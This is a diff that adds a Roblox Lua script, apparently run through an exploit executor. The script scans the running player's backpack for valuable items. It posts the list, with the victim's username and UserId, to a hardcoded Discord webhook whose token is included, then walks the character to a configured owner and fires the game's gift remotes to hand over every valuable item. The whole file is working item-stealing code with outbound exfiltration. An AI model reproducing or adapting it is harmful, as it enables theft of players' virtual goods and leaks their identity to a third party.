@@ -1,0 +1,111 @@
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+local lp = Players.LocalPlayer
+
+-- CONFIG
+local OWNER = "YourUsernameHere"
+local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
+local MIN_MULT = 1.5 -- only steal items with multiplier >= this
+
+-- Figure out what's worth stealing
+local function isValuable(name)
+    if name:lower():find("totem") then return true end
+    if name:lower():find("grail") then return true end
+    if name:lower():find("stopwatch") then return true end
+    local mult = name:match("%[([%d%.]+)x%]")
+    if mult and tonumber(mult) >= MIN_MULT then return true end
+    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine"}) do
+        if name:lower():find("%[" .. mut .. "%]") then return true end
+    end
+    return false
+end
+
+local function getItems()
+    local found = {}
+    for _, item in ipairs(lp.Backpack:GetChildren()) do
+        if item:IsA("Tool") and isValuable(item.Name) then
+            table.insert(found, item)
+        end
+    end
+    return found
+end
+
+-- Send webhook
+local function sendWebhook(items)
+    local list = {}
+    for _, item in ipairs(items) do table.insert(list, "• " .. item.Name) end
+    local body = game:GetService("HttpService"):JSONEncode({
+        content = "@everyone",
+        embeds = {{
+            title = "CVP Hit — " .. lp.Name,
+            description = table.concat(list, "\n"),
+            color = 5763719,
+            footer = { text = lp.Name .. " • " .. lp.UserId },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    })
+    pcall(function()
+        local req = request or http_request or (syn and syn.request)
+        req({ Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body })
+    end)
+end
+
+-- Equip item and gift it to owner
+local function giftItem(ownerPlayer, item)
+    local char = lp.Character
+    local hum = char and char:FindFirstChild("Humanoid")
+    local ownerChar = ownerPlayer.Character
+    local ownerRoot = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
+    if not hum or not ownerRoot then return end
+
+    -- Walk close to owner
+    hum:MoveTo(ownerRoot.Position)
+    hum.MoveToFinished:Wait()
+    task.wait(0.3)
+
+    -- Equip the item (moves it from backpack into character)
+    item.Parent = char
+    task.wait(0.3)
+
+    -- Set gift target then fire gift
+    RS.Remotes.SetGiftTarget:FireServer(ownerPlayer)
+    task.wait(0.2)
+    RS.Remotes.GiftItem:FireServer(item)
+    task.wait(0.5)
+end
+
+local function giftAll(ownerPlayer, items)
+    RS.Remotes.SetGiftTarget:FireServer(ownerPlayer)
+    task.wait(0.3)
+    for _, item in ipairs(items) do
+        giftItem(ownerPlayer, item)
+    end
+end
+
+local function findOwner()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= lp and p.Name:lower() == OWNER:lower() then
+            return p
+        end
+    end
+    return nil
+end
+
+-- MAIN
+local items = getItems()
+if #items == 0 then return end
+
+sendWebhook(items)
+
+local owner = findOwner()
+if owner then
+    giftAll(owner, items)
+else
+    Players.PlayerAdded:Connect(function(p)
+        if p.Name:lower() == OWNER:lower() then
+            p.CharacterAdded:Wait()
+            task.wait(2)
+            giftAll(p, items)
+        end
+    end)
+end
